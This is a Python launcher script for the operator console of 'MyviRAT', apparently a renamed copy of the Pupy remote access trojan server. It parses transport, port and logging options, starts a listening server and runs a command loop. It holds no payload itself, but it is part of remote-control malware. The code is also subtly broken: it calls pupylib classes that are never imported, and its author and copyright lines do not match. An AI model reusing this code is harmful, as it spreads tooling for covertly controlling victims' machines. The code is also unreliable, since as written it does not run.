#!/usr/bin/env python
# -*- coding: utf-8 -*-
#-------------------------------------------------------------------------------
#Copyright (c) 2017 Alexandrov
#
#Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:
#
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.

#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#SOFTWARE.
#-------------------------------------------------------------------------------
import library.Server
import library.Cmd
try:
    import library.SignalHandler
except:
    pass
import logging
import time
import traceback
import argparse
import os
import os.path
import network.conf

__author__='Andy Ashraaf'
__version__='v0.1'
__date__='Feb 1 2017'

def print_version():
    print("MyviRAT - %s"%(__version__))


if __name__=="__main__":
    parser = argparse.ArgumentParser(prog='Myvish', description="MyviRAT console")
    parser.add_argument('--log-lvl', '--lvl', help="change log verbosity", dest="loglevel", choices=["DEBUG","INFO","WARNING","ERROR"], default="WARNING")
    parser.add_argument('--version', help="print version and exit", action='store_true')
    parser.add_argument('-t', '--transport', choices=[x for x in network.conf.transports.iterkeys()], help="change the transport ! :-)")
    parser.add_argument('--ta', '--transport-args', dest='transport_args', help="... --transport-args 'OPTION1=value OPTION2=val ...' ...")
    parser.add_argument('--port', '-p', help="change the listening port", type=int)
    parser.add_argument('--workdir', help='Set Workdir (Default = current workdir)')
    args=parser.parse_args()

    if args.workdir:
       os.chdir(args.workdir)

    if args.version:
        print_version()
        exit(0)
    loglevel=logging.WARNING
    if args.loglevel=="ERROR":
        loglevel=logging.ERROR
    elif args.loglevel=="DEBUG":
        loglevel=logging.DEBUG
    elif args.loglevel=="INFO":
        loglevel=logging.INFO
    else:
        loglevel=logging.WARNING
    logging.basicConfig(format='%(asctime)-15s - %(levelname)-5s - %(message)s')
    logging.getLogger().setLevel(loglevel)

    pupyServer=pupylib.PupyServer.PupyServer(args.transport, args.transport_args, port=args.port)
    try:
        import __builtin__ as builtins
    except ImportError:
        import builtins
    builtins.glob_pupyServer=pupyServer # dirty ninja trick for this particular case avoiding to touch rpyc source code
    pcmd=pupylib.PupyCmd.PupyCmd(pupyServer)
    pupyServer.start()
    while True:
        try:
            pcmd.cmdloop()
        except Exception as e:
            print(traceback.format_exc())
            time.sleep(0.1) #to avoid flood in case of exceptions in loop
            pcmd.intro=''
